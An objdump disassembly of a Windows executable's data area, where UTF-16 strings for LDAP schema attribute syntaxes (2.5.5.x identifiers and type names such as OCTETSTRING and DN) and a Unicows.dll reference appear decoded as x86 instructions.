  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	d8 85 40 00 16 05    	fadds  0x5160040(%ebp)
  403bce:	43                   	inc    %ebx
  403bcf:	00 70 58             	add    %dh,0x58(%eax)
  403bd2:	41                   	inc    %ecx
  403bd3:	00 1a                	add    %bl,(%edx)
  403bd5:	62 41 00             	bound  %eax,0x0(%ecx)
  403bd8:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  403bdc:	94                   	xchg   %eax,%esp
  403bdd:	60                   	pusha
  403bde:	41                   	inc    %ecx
  403bdf:	00 30                	add    %dh,(%eax)
  403be1:	86 40 00             	xchg   %al,0x0(%eax)
  403be4:	dd 64 41 00          	frstor 0x0(%ecx,%eax,2)
  403be8:	59                   	pop    %ecx
  403be9:	46                   	inc    %esi
  403bea:	41                   	inc    %ecx
  403beb:	00 5d 46             	add    %bl,0x46(%ebp)
  403bee:	41                   	inc    %ecx
  403bef:	00 04 59             	add    %al,(%ecx,%ebx,2)
  403bf2:	41                   	inc    %ecx
  403bf3:	00 65 46             	add    %ah,0x46(%ebp)
  403bf6:	41                   	inc    %ecx
  403bf7:	00 65 46             	add    %ah,0x46(%ebp)
  403bfa:	41                   	inc    %ecx
  403bfb:	00 1f                	add    %bl,(%edi)
  403bfd:	be 41 00 ff f4       	mov    $0xf4ff0041,%esi
  403c02:	41                   	inc    %ecx
  403c03:	00 57 da             	add    %dl,-0x26(%edi)
  403c06:	41                   	inc    %ecx
  403c07:	00 d7                	add    %dl,%bh
  403c09:	61                   	popa
  403c0a:	41                   	inc    %ecx
  403c0b:	00 e6                	add    %ah,%dh
  403c0d:	06                   	push   %es
  403c0e:	42                   	inc    %edx
  403c0f:	00 4c 4b 41          	add    %cl,0x41(%ebx,%ecx,2)
  403c13:	00 ce                	add    %cl,%dh
  403c15:	9c                   	pushf
  403c16:	42                   	inc    %edx
  403c17:	00 d6                	add    %dl,%dh
  403c19:	59                   	pop    %ecx
  403c1a:	41                   	inc    %ecx
  403c1b:	00 29                	add    %ch,(%ecx)
  403c1d:	4a                   	dec    %edx
  403c1e:	41                   	inc    %ecx
  403c1f:	00 8b d9 41 00 72    	add    %cl,0x720041d9(%ebx)
  403c25:	46                   	inc    %esi
  403c26:	41                   	inc    %ecx
  403c27:	00 9c be 41 00 c5 be 	add    %bl,-0x413affbf(%esi,%edi,4)
  403c2e:	41                   	inc    %ecx
  403c2f:	00 6d 46             	add    %ch,0x46(%ebp)
  403c32:	41                   	inc    %ecx
  403c33:	00 43 80             	add    %al,-0x80(%ebx)
  403c36:	42                   	inc    %edx
  403c37:	00 8d be 41 00 35    	add    %cl,0x350041be(%ebp)
  403c3d:	96                   	xchg   %eax,%esi
  403c3e:	41                   	inc    %ecx
  403c3f:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403c45:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  403c4a:	41                   	inc    %ecx
  403c4b:	00 8d be 41 00 d7    	add    %cl,-0x28ffbe42(%ebp)
  403c51:	61                   	popa
  403c52:	41                   	inc    %ecx
  403c53:	00 7b be             	add    %bh,-0x42(%ebx)
  403c56:	41                   	inc    %ecx
  403c57:	00 8d be 41 00 e7    	add    %cl,-0x18ffbe42(%ebp)
  403c5d:	a0 42 00 5d 07       	mov    0x75d0042,%al
  403c62:	42                   	inc    %edx
  403c63:	00 00                	add    %al,(%eax)
  403c65:	8c 42 00             	mov    %es,0x0(%edx)
  403c68:	5b                   	pop    %ebx
  403c69:	c0 41 00 6e          	rolb   $0x6e,0x0(%ecx)
  403c6d:	c0 41 00 4f          	rolb   $0x4f,0x0(%ecx)
  403c71:	4f                   	dec    %edi
  403c72:	41                   	inc    %ecx
  403c73:	00 78 80             	add    %bh,-0x80(%eax)
  403c76:	42                   	inc    %edx
  403c77:	00 a8 49 41 00 30    	add    %ch,0x30004149(%eax)
  403c7d:	44                   	inc    %esp
  403c7e:	41                   	inc    %ecx
  403c7f:	00 0a                	add    %cl,(%edx)
  403c81:	59                   	pop    %ecx
  403c82:	41                   	inc    %ecx
  403c83:	00 12                	add    %dl,(%edx)
  403c85:	4b                   	dec    %ebx
  403c86:	41                   	inc    %ecx
  403c87:	00 00                	add    %al,(%eax)
  403c89:	be 41 00 d1 53       	mov    $0x53d10041,%esi
  403c8e:	41                   	inc    %ecx
  403c8f:	00 af ba 42 00 b1    	add    %ch,-0x4effbd46(%edi)
  403c95:	48                   	dec    %eax
  403c96:	41                   	inc    %ecx
  403c97:	00 fb                	add    %bh,%bl
  403c99:	c0 41 00 77          	rolb   $0x77,0x0(%ecx)
  403c9d:	46                   	inc    %esi
  403c9e:	41                   	inc    %ecx
  403c9f:	00 2a                	add    %ch,(%edx)
  403ca1:	48                   	dec    %eax
  403ca2:	41                   	inc    %ecx
  403ca3:	00 d3                	add    %dl,%bl
  403ca5:	49                   	dec    %ecx
  403ca6:	41                   	inc    %ecx
  403ca7:	00 49 48             	add    %cl,0x48(%ecx)
  403caa:	41                   	inc    %ecx
  403cab:	00 ae b9 42 00 53    	add    %ch,0x530042b9(%esi)
  403cb1:	f0 41                	lock inc %ecx
  403cb3:	00 05 c3 41 00 c2    	add    %al,0xc20041c3
  403cb9:	00 42 00             	add    %al,0x0(%edx)
  403cbc:	ab                   	stos   %eax,%es:(%edi)
  403cbd:	69 42 00 74 84 42 00 	imul   $0x428474,0x0(%edx),%eax
  403cc4:	da 95 42 00 99 4a    	ficoml 0x4a990042(%ebp)
  403cca:	41                   	inc    %ecx
  403ccb:	00 ab bd 42 00 23    	add    %ch,0x230042bd(%ebx)
  403cd1:	bf 42 00 33 48       	mov    $0x48330042,%edi
  403cd6:	41                   	inc    %ecx
  403cd7:	00 7e 9a             	add    %bh,-0x66(%esi)
  403cda:	42                   	inc    %edx
  403cdb:	00 49 9e             	add    %cl,-0x62(%ecx)
  403cde:	42                   	inc    %edx
  403cdf:	00 4f a0             	add    %cl,-0x60(%edi)
  403ce2:	42                   	inc    %edx
  403ce3:	00 17                	add    %dl,(%edi)
  403ce5:	59                   	pop    %ecx
  403ce6:	41                   	inc    %ecx
  403ce7:	00 13                	add    %dl,(%ebx)
  403ce9:	59                   	pop    %ecx
  403cea:	41                   	inc    %ecx
  403ceb:	00 a7 72 42 00 0e    	add    %ah,0xe004272(%edi)
  403cf1:	5e                   	pop    %esi
  403cf2:	41                   	inc    %ecx
  403cf3:	00 33                	add    %dh,(%ebx)
  403cf5:	4c                   	dec    %esp
  403cf6:	41                   	inc    %ecx
  403cf7:	00 6a 5d             	add    %ch,0x5d(%edx)
  403cfa:	41                   	inc    %ecx
  403cfb:	00 cc                	add    %cl,%ah
  403cfd:	50                   	push   %eax
  403cfe:	41                   	inc    %ecx
  403cff:	00 cb                	add    %cl,%bl
  403d01:	5a                   	pop    %edx
  403d02:	41                   	inc    %ecx
  403d03:	00 13                	add    %dl,(%ebx)
  403d05:	59                   	pop    %ecx
  403d06:	41                   	inc    %ecx
  403d07:	00 64 86 40          	add    %ah,0x40(%esi,%eax,4)
  403d0b:	00 ea                	add    %ch,%dl
  403d0d:	60                   	pusha
  403d0e:	41                   	inc    %ecx
  403d0f:	00 59 46             	add    %bl,0x46(%ecx)
  403d12:	41                   	inc    %ecx
  403d13:	00 5d 46             	add    %bl,0x46(%ebp)
  403d16:	41                   	inc    %ecx
  403d17:	00 d7                	add    %dl,%bh
  403d19:	61                   	popa
  403d1a:	41                   	inc    %ecx
  403d1b:	00 65 46             	add    %ah,0x46(%ebp)
  403d1e:	41                   	inc    %ecx
  403d1f:	00 65 46             	add    %ah,0x46(%ebp)
  403d22:	41                   	inc    %ecx
  403d23:	00 1f                	add    %bl,(%edi)
  403d25:	be 41 00 ff f4       	mov    $0xf4ff0041,%esi
  403d2a:	41                   	inc    %ecx
  403d2b:	00 57 da             	add    %dl,-0x26(%edi)
  403d2e:	41                   	inc    %ecx
  403d2f:	00 d7                	add    %dl,%bh
  403d31:	61                   	popa
  403d32:	41                   	inc    %ecx
  403d33:	00 e6                	add    %ah,%dh
  403d35:	06                   	push   %es
  403d36:	42                   	inc    %edx
  403d37:	00 c9                	add    %cl,%cl
  403d39:	46                   	inc    %esi
  403d3a:	41                   	inc    %ecx
  403d3b:	00 8a 0d 43 00 dc    	add    %cl,-0x23ffbcf3(%edx)
  403d41:	0a 42 00             	or     0x0(%edx),%al
  403d44:	72 46                	jb     0x403d8c
  403d46:	41                   	inc    %ecx
  403d47:	00 8b d9 41 00 72    	add    %cl,0x720041d9(%ebx)
  403d4d:	46                   	inc    %esi
  403d4e:	41                   	inc    %ecx
  403d4f:	00 9c be 41 00 c5 be 	add    %bl,-0x413affbf(%esi,%edi,4)
  403d56:	41                   	inc    %ecx
  403d57:	00 6d 46             	add    %ch,0x46(%ebp)
  403d5a:	41                   	inc    %ecx
  403d5b:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403d61:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  403d66:	41                   	inc    %ecx
  403d67:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403d6d:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  403d72:	41                   	inc    %ecx
  403d73:	00 8d be 41 00 d7    	add    %cl,-0x28ffbe42(%ebp)
  403d79:	61                   	popa
  403d7a:	41                   	inc    %ecx
  403d7b:	00 7b be             	add    %bh,-0x42(%ebx)
  403d7e:	41                   	inc    %ecx
  403d7f:	00 8d be 41 00 77    	add    %cl,0x770041be(%ebp)
  403d85:	46                   	inc    %esi
  403d86:	41                   	inc    %ecx
  403d87:	00 5d 07             	add    %bl,0x7(%ebp)
  403d8a:	42                   	inc    %edx
  403d8b:	00 94 c1 41 00 5b c0 	add    %dl,-0x3fa4ffbf(%ecx,%eax,8)
  403d92:	41                   	inc    %ecx
  403d93:	00 6e c0             	add    %ch,-0x40(%esi)
  403d96:	41                   	inc    %ecx
  403d97:	00 7f 46             	add    %bh,0x46(%edi)
  403d9a:	41                   	inc    %ecx
  403d9b:	00 8a 0d 43 00 8a    	add    %cl,-0x75ffbcf3(%edx)
  403da1:	0d 43 00 30 44       	or     $0x44300043,%eax
  403da6:	41                   	inc    %ecx
  403da7:	00 d7                	add    %dl,%bh
  403da9:	61                   	popa
  403daa:	41                   	inc    %ecx
  403dab:	00 c9                	add    %cl,%cl
  403dad:	46                   	inc    %esi
  403dae:	41                   	inc    %ecx
  403daf:	00 00                	add    %al,(%eax)
  403db1:	be 41 00 c9 46       	mov    $0x46c90041,%esi
  403db6:	41                   	inc    %ecx
  403db7:	00 8a 0d 43 00 8a    	add    %cl,-0x75ffbcf3(%edx)
  403dbd:	0d 43 00 fb c0       	or     $0xc0fb0043,%eax
  403dc2:	41                   	inc    %ecx
  403dc3:	00 77 46             	add    %dh,0x46(%edi)
  403dc6:	41                   	inc    %ecx
  403dc7:	00 2a                	add    %ch,(%edx)
  403dc9:	48                   	dec    %eax
  403dca:	41                   	inc    %ecx
  403dcb:	00 94 60 41 00 9c 86 	add    %dl,-0x7963ffbf(%eax,%eiz,2)
  403dd2:	40                   	inc    %eax
  403dd3:	00 5b 61             	add    %bl,0x61(%ebx)
  403dd6:	41                   	inc    %ecx
  403dd7:	00 59 46             	add    %bl,0x46(%ecx)
  403dda:	41                   	inc    %ecx
  403ddb:	00 5d 46             	add    %bl,0x46(%ebp)
  403dde:	41                   	inc    %ecx
  403ddf:	00 d7                	add    %dl,%bh
  403de1:	61                   	popa
  403de2:	41                   	inc    %ecx
  403de3:	00 65 46             	add    %ah,0x46(%ebp)
  403de6:	41                   	inc    %ecx
  403de7:	00 65 46             	add    %ah,0x46(%ebp)
  403dea:	41                   	inc    %ecx
  403deb:	00 1f                	add    %bl,(%edi)
  403ded:	be 41 00 ff f4       	mov    $0xf4ff0041,%esi
  403df2:	41                   	inc    %ecx
  403df3:	00 57 da             	add    %dl,-0x26(%edi)
  403df6:	41                   	inc    %ecx
  403df7:	00 d7                	add    %dl,%bh
  403df9:	61                   	popa
  403dfa:	41                   	inc    %ecx
  403dfb:	00 e6                	add    %ah,%dh
  403dfd:	06                   	push   %es
  403dfe:	42                   	inc    %edx
  403dff:	00 c9                	add    %cl,%cl
  403e01:	46                   	inc    %esi
  403e02:	41                   	inc    %ecx
  403e03:	00 8a 0d 43 00 00    	add    %cl,0x430d(%edx)
  403e09:	08 42 00             	or     %al,0x0(%edx)
  403e0c:	72 46                	jb     0x403e54
  403e0e:	41                   	inc    %ecx
  403e0f:	00 8b d9 41 00 72    	add    %cl,0x720041d9(%ebx)
  403e15:	46                   	inc    %esi
  403e16:	41                   	inc    %ecx
  403e17:	00 9c be 41 00 c5 be 	add    %bl,-0x413affbf(%esi,%edi,4)
  403e1e:	41                   	inc    %ecx
  403e1f:	00 6d 46             	add    %ch,0x46(%ebp)
  403e22:	41                   	inc    %ecx
  403e23:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403e29:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  403e2e:	41                   	inc    %ecx
  403e2f:	00 8d be 41 00 8d    	add    %cl,-0x72ffbe42(%ebp)
  403e35:	be 41 00 8d be       	mov    $0xbe8d0041,%esi
  403e3a:	41                   	inc    %ecx
  403e3b:	00 8d be 41 00 d7    	add    %cl,-0x28ffbe42(%ebp)
  403e41:	61                   	popa
  403e42:	41                   	inc    %ecx
  403e43:	00 7b be             	add    %bh,-0x42(%ebx)
  403e46:	41                   	inc    %ecx
  403e47:	00 8d be 41 00 77    	add    %cl,0x770041be(%ebp)
  403e4d:	46                   	inc    %esi
  403e4e:	41                   	inc    %ecx
  403e4f:	00 5d 07             	add    %bl,0x7(%ebp)
  403e52:	42                   	inc    %edx
  403e53:	00 94 c1 41 00 5b c0 	add    %dl,-0x3fa4ffbf(%ecx,%eax,8)
  403e5a:	41                   	inc    %ecx
  403e5b:	00 6e c0             	add    %ch,-0x40(%esi)
  403e5e:	41                   	inc    %ecx
  403e5f:	00 7f 46             	add    %bh,0x46(%edi)
  403e62:	41                   	inc    %ecx
  403e63:	00 8a 0d 43 00 8a    	add    %cl,-0x75ffbcf3(%edx)
  403e69:	0d 43 00 30 44       	or     $0x44300043,%eax
  403e6e:	41                   	inc    %ecx
  403e6f:	00 d7                	add    %dl,%bh
  403e71:	61                   	popa
  403e72:	41                   	inc    %ecx
  403e73:	00 c9                	add    %cl,%cl
  403e75:	46                   	inc    %esi
  403e76:	41                   	inc    %ecx
  403e77:	00 00                	add    %al,(%eax)
  403e79:	be 41 00 9b 0b       	mov    $0xb9b0041,%esi
  403e7e:	42                   	inc    %edx
  403e7f:	00 8a 0d 43 00 8a    	add    %cl,-0x75ffbcf3(%edx)
  403e85:	0d 43 00 fb c0       	or     $0xc0fb0043,%eax
  403e8a:	41                   	inc    %ecx
  403e8b:	00 77 46             	add    %dh,0x46(%edi)
  403e8e:	41                   	inc    %ecx
  403e8f:	00 2a                	add    %ch,(%edx)
  403e91:	48                   	dec    %eax
  403e92:	41                   	inc    %ecx
  403e93:	00 94 60 41 00 1c 61 	add    %dl,0x611c0041(%eax,%eiz,2)
  403e9a:	41                   	inc    %ecx
  403e9b:	00 77 61             	add    %dh,0x61(%edi)
  403e9e:	41                   	inc    %ecx
  403e9f:	00 53 f0             	add    %dl,-0x10(%ebx)
  403ea2:	41                   	inc    %ecx
  403ea3:	00 05 c3 41 00 c2    	add    %al,0xc20041c3
  403ea9:	00 42 00             	add    %al,0x0(%edx)
  403eac:	2a 48 41             	sub    0x41(%eax),%cl
  403eaf:	00 51 61             	add    %dl,0x61(%ecx)
  403eb2:	41                   	inc    %ecx
  403eb3:	00 e4                	add    %ah,%ah
  403eb5:	86 40 00             	xchg   %al,0x0(%eax)
  403eb8:	16                   	push   %ss
  403eb9:	05 43 00 7c 62       	add    $0x627c0043,%eax
  403ebe:	41                   	inc    %ecx
  403ebf:	00 1a                	add    %bl,(%edx)
  403ec1:	62 41 00             	bound  %eax,0x0(%ecx)
  403ec4:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
  403ec8:	94                   	xchg   %eax,%esp
  403ec9:	60                   	pusha
  403eca:	41                   	inc    %ecx
  403ecb:	00 28                	add    %ch,(%eax)
  403ecd:	87 40 00             	xchg   %eax,0x0(%eax)
  403ed0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ed1:	63 41 00             	arpl   %eax,0x0(%ecx)
  403ed4:	d7                   	xlat   %ds:(%ebx)
  403ed5:	61                   	popa
  403ed6:	41                   	inc    %ecx
  403ed7:	00 cb                	add    %cl,%bl
  403ed9:	62 41 00             	bound  %eax,0x0(%ecx)
  403edc:	da 61 41             	fisubl 0x41(%ecx)
  403edf:	00 73 00             	add    %dh,0x0(%ebx)
  403ee2:	63 00                	arpl   %eax,(%eax)
  403ee4:	68 00 65 00 6d       	push   $0x6d006500
  403ee9:	00 61 00             	add    %ah,0x0(%ecx)
  403eec:	2f                   	das
  403eed:	00 00                	add    %al,(%eax)
  403eef:	00 11                	add    %dl,(%ecx)
  403ef1:	bd 00 00 01 00       	mov    $0x10000,%ebp
	...
  403efe:	00 00                	add    %al,(%eax)
  403f00:	0c 00                	or     $0x0,%al
  403f02:	00 00                	add    %al,(%eax)
  403f04:	4b                   	dec    %ebx
  403f05:	95                   	xchg   %eax,%ebp
  403f06:	41                   	inc    %ecx
	...
  403f1f:	00 8e 79 41 00 f0    	add    %cl,-0xfffbe87(%esi)
  403f25:	3e 40                	ds inc %eax
  403f27:	00 11                	add    %dl,(%ecx)
  403f29:	bd 00 00 00 03       	mov    $0x3000000,%ebp
	...
  403f36:	00 00                	add    %al,(%eax)
  403f38:	0c 00                	or     $0x0,%al
  403f3a:	00 00                	add    %al,(%eax)
  403f3c:	30 44 41 00          	xor    %al,0x0(%ecx,%eax,2)
	...
  403f58:	8e 79 41             	mov    0x41(%ecx),%?
  403f5b:	00 28                	add    %ch,(%eax)
  403f5d:	3f                   	aas
  403f5e:	40                   	inc    %eax
  403f5f:	00 32                	add    %dh,(%edx)
  403f61:	00 2e                	add    %ch,(%esi)
  403f63:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403f69:	00 2e                	add    %ch,(%esi)
  403f6b:	00 31                	add    %dh,(%ecx)
  403f6d:	00 37                	add    %dh,(%edi)
  403f6f:	00 00                	add    %al,(%eax)
  403f71:	00 00                	add    %al,(%eax)
  403f73:	00 32                	add    %dh,(%edx)
  403f75:	00 2e                	add    %ch,(%esi)
  403f77:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403f7d:	00 2e                	add    %ch,(%esi)
  403f7f:	00 31                	add    %dh,(%ecx)
  403f81:	00 36                	add    %dh,(%esi)
  403f83:	00 00                	add    %al,(%eax)
  403f85:	00 00                	add    %al,(%eax)
  403f87:	00 32                	add    %dh,(%edx)
  403f89:	00 2e                	add    %ch,(%esi)
  403f8b:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403f91:	00 2e                	add    %ch,(%esi)
  403f93:	00 31                	add    %dh,(%ecx)
  403f95:	00 35 00 00 00 00    	add    %dh,0x0
  403f9b:	00 32                	add    %dh,(%edx)
  403f9d:	00 2e                	add    %ch,(%esi)
  403f9f:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403fa5:	00 2e                	add    %ch,(%esi)
  403fa7:	00 31                	add    %dh,(%ecx)
  403fa9:	00 34 00             	add    %dh,(%eax,%eax,1)
  403fac:	00 00                	add    %al,(%eax)
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	32 00                	xor    (%eax),%al
  403fb2:	2e 00 35 00 2e 00 35 	add    %dh,%cs:0x35002e00
  403fb9:	00 2e                	add    %ch,(%esi)
  403fbb:	00 31                	add    %dh,(%ecx)
  403fbd:	00 33                	add    %dh,(%ebx)
  403fbf:	00 00                	add    %al,(%eax)
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 32                	add    %dh,(%edx)
  403fc5:	00 2e                	add    %ch,(%esi)
  403fc7:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403fcd:	00 2e                	add    %ch,(%esi)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 32                	add    %dh,(%edx)
  403fd3:	00 00                	add    %al,(%eax)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 32                	add    %dh,(%edx)
  403fd9:	00 2e                	add    %ch,(%esi)
  403fdb:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403fe1:	00 2e                	add    %ch,(%esi)
  403fe3:	00 31                	add    %dh,(%ecx)
  403fe5:	00 30                	add    %dh,(%eax)
  403fe7:	00 00                	add    %al,(%eax)
  403fe9:	00 00                	add    %al,(%eax)
  403feb:	00 32                	add    %dh,(%edx)
  403fed:	00 2e                	add    %ch,(%esi)
  403fef:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  403ff5:	00 2e                	add    %ch,(%esi)
  403ff7:	00 37                	add    %dh,(%edi)
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	00 32                	add    %dh,(%edx)
  403ffd:	00 2e                	add    %ch,(%esi)
  403fff:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  404005:	00 2e                	add    %ch,(%esi)
  404007:	00 36                	add    %dh,(%esi)
  404009:	00 00                	add    %al,(%eax)
  40400b:	00 32                	add    %dh,(%edx)
  40400d:	00 2e                	add    %ch,(%esi)
  40400f:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  404015:	00 2e                	add    %ch,(%esi)
  404017:	00 35 00 00 00 32    	add    %dh,0x32000000
  40401d:	00 2e                	add    %ch,(%esi)
  40401f:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  404025:	00 2e                	add    %ch,(%esi)
  404027:	00 33                	add    %dh,(%ebx)
  404029:	00 00                	add    %al,(%eax)
  40402b:	00 32                	add    %dh,(%edx)
  40402d:	00 2e                	add    %ch,(%esi)
  40402f:	00 35 00 2e 00 35    	add    %dh,0x35002e00
  404035:	00 2e                	add    %ch,(%esi)
  404037:	00 30                	add    %dh,(%eax)
  404039:	00 00                	add    %al,(%eax)
  40403b:	00 4f 00             	add    %cl,0x0(%edi)
  40403e:	42                   	inc    %edx
  40403f:	00 4a 00             	add    %cl,0x0(%edx)
  404042:	45                   	inc    %ebp
  404043:	00 43 00             	add    %al,0x0(%ebx)
  404046:	54                   	push   %esp
  404047:	00 53 00             	add    %dl,0x0(%ebx)
  40404a:	45                   	inc    %ebp
  40404b:	00 43 00             	add    %al,0x0(%ebx)
  40404e:	55                   	push   %ebp
  40404f:	00 52 00             	add    %dl,0x0(%edx)
  404052:	49                   	dec    %ecx
  404053:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  404057:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40405b:	00 53 00             	add    %dl,0x0(%ebx)
  40405e:	43                   	inc    %ebx
  40405f:	00 52 00             	add    %dl,0x0(%edx)
  404062:	49                   	dec    %ecx
  404063:	00 50 00             	add    %dl,0x0(%eax)
  404066:	54                   	push   %esp
  404067:	00 4f 00             	add    %cl,0x0(%edi)
  40406a:	52                   	push   %edx
  40406b:	00 00                	add    %al,(%eax)
  40406d:	00 00                	add    %al,(%eax)
  40406f:	00 49 00             	add    %cl,0x0(%ecx)
  404072:	4e                   	dec    %esi
  404073:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  404077:	00 47 00             	add    %al,0x0(%edi)
  40407a:	45                   	inc    %ebp
  40407b:	00 52 00             	add    %dl,0x0(%edx)
  40407e:	38 00                	cmp    %al,(%eax)
  404080:	00 00                	add    %al,(%eax)
  404082:	00 00                	add    %al,(%eax)
  404084:	4f                   	dec    %edi
  404085:	00 49 00             	add    %cl,0x0(%ecx)
  404088:	44                   	inc    %esp
  404089:	00 00                	add    %al,(%eax)
  40408b:	00 49 00             	add    %cl,0x0(%ecx)
  40408e:	4e                   	dec    %esi
  40408f:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  404093:	00 47 00             	add    %al,0x0(%edi)
  404096:	45                   	inc    %ebp
  404097:	00 52 00             	add    %dl,0x0(%edx)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	42                   	inc    %edx
  40409d:	00 4f 00             	add    %cl,0x0(%edi)
  4040a0:	4f                   	dec    %edi
  4040a1:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4040a5:	00 41 00             	add    %al,0x0(%ecx)
  4040a8:	4e                   	dec    %esi
  4040a9:	00 00                	add    %al,(%eax)
  4040ab:	00 4f 00             	add    %cl,0x0(%edi)
  4040ae:	43                   	inc    %ebx
  4040af:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  4040b3:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  4040b7:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  4040bb:	00 49 00             	add    %cl,0x0(%ecx)
  4040be:	4e                   	dec    %esi
  4040bf:	00 47 00             	add    %al,0x0(%edi)
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	4f                   	dec    %edi
  4040c5:	00 52 00             	add    %dl,0x0(%edx)
  4040c8:	4e                   	dec    %esi
  4040c9:	00 41 00             	add    %al,0x0(%ecx)
  4040cc:	4d                   	dec    %ebp
  4040cd:	00 45 00             	add    %al,0x0(%ebp)
  4040d0:	00 00                	add    %al,(%eax)
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	55                   	push   %ebp
  4040d5:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  4040d9:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  4040dd:	00 4d 00             	add    %cl,0x0(%ebp)
  4040e0:	45                   	inc    %ebp
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 4e 00             	add    %cl,0x0(%esi)
  4040e6:	55                   	push   %ebp
  4040e7:	00 4d 00             	add    %cl,0x0(%ebp)
  4040ea:	45                   	inc    %ebp
  4040eb:	00 52 00             	add    %dl,0x0(%edx)
  4040ee:	49                   	dec    %ecx
  4040ef:	00 43 00             	add    %al,0x0(%ebx)
  4040f2:	53                   	push   %ebx
  4040f3:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  4040f7:	00 49 00             	add    %cl,0x0(%ecx)
  4040fa:	4e                   	dec    %esi
  4040fb:	00 47 00             	add    %al,0x0(%edi)
  4040fe:	00 00                	add    %al,(%eax)
  404100:	50                   	push   %eax
  404101:	00 52 00             	add    %dl,0x0(%edx)
  404104:	49                   	dec    %ecx
  404105:	00 4e 00             	add    %cl,0x0(%esi)
  404108:	54                   	push   %esp
  404109:	00 41 00             	add    %al,0x0(%ecx)
  40410c:	42                   	inc    %edx
  40410d:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  404111:	00 53 00             	add    %dl,0x0(%ebx)
  404114:	54                   	push   %esp
  404115:	00 52 00             	add    %dl,0x0(%edx)
  404118:	49                   	dec    %ecx
  404119:	00 4e 00             	add    %cl,0x0(%esi)
  40411c:	47                   	inc    %edi
  40411d:	00 00                	add    %al,(%eax)
  40411f:	00 43 00             	add    %al,0x0(%ebx)
  404122:	41                   	inc    %ecx
  404123:	00 53 00             	add    %dl,0x0(%ebx)
  404126:	45                   	inc    %ebp
  404127:	00 49 00             	add    %cl,0x0(%ecx)
  40412a:	47                   	inc    %edi
  40412b:	00 4e 00             	add    %cl,0x0(%esi)
  40412e:	4f                   	dec    %edi
  40412f:	00 52 00             	add    %dl,0x0(%edx)
  404132:	45                   	inc    %ebp
  404133:	00 53 00             	add    %dl,0x0(%ebx)
  404136:	54                   	push   %esp
  404137:	00 52 00             	add    %dl,0x0(%edx)
  40413a:	49                   	dec    %ecx
  40413b:	00 4e 00             	add    %cl,0x0(%esi)
  40413e:	47                   	inc    %edi
  40413f:	00 00                	add    %al,(%eax)
  404141:	00 00                	add    %al,(%eax)
  404143:	00 49 00             	add    %cl,0x0(%ecx)
  404146:	41                   	inc    %ecx
  404147:	00 35 00 53 00 54    	add    %dh,0x54005300
  40414d:	00 52 00             	add    %dl,0x0(%edx)
  404150:	49                   	dec    %ecx
  404151:	00 4e 00             	add    %cl,0x0(%esi)
  404154:	47                   	inc    %edi
  404155:	00 00                	add    %al,(%eax)
  404157:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40415b:	00 52 00             	add    %dl,0x0(%edx)
  40415e:	45                   	inc    %ebp
  40415f:	00 43 00             	add    %al,0x0(%ebx)
  404162:	54                   	push   %esp
  404163:	00 4f 00             	add    %cl,0x0(%edi)
  404166:	52                   	push   %edx
  404167:	00 59 00             	add    %bl,0x0(%ecx)
  40416a:	53                   	push   %ebx
  40416b:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40416f:	00 49 00             	add    %cl,0x0(%ecx)
  404172:	4e                   	dec    %esi
  404173:	00 47 00             	add    %al,0x0(%edi)
  404176:	00 00                	add    %al,(%eax)
  404178:	44                   	inc    %esp
  404179:	00 4e 00             	add    %cl,0x0(%esi)
  40417c:	00 00                	add    %al,(%eax)
  40417e:	00 00                	add    %al,(%eax)
  404180:	55                   	push   %ebp
  404181:	6e                   	outsb  %ds:(%esi),(%dx)
  404182:	69 63 6f 77 73 2e 64 	imul   $0x642e7377,0x6f(%ebx),%esp
  404189:	6c                   	insb   (%dx),%es:(%edi)
  40418a:	6c                   	insb   (%dx),%es:(%edi)
  40418b:	00 3f                	add    %bh,(%edi)
  40418d:	00 3f                	add    %bh,(%edi)
  40418f:	00 3f                	add    %bh,(%edi)
  404191:	00 2e                	add    %ch,(%esi)
  404193:	00 3f                	add    %bh,(%edi)
  404195:	00 3f                	add    %bh,(%edi)
  404197:	00 3f                	add    %bh,(%edi)
  404199:	00 00                	add    %al,(%eax)
  40419b:	00 4b 00             	add    %cl,0x0(%ebx)
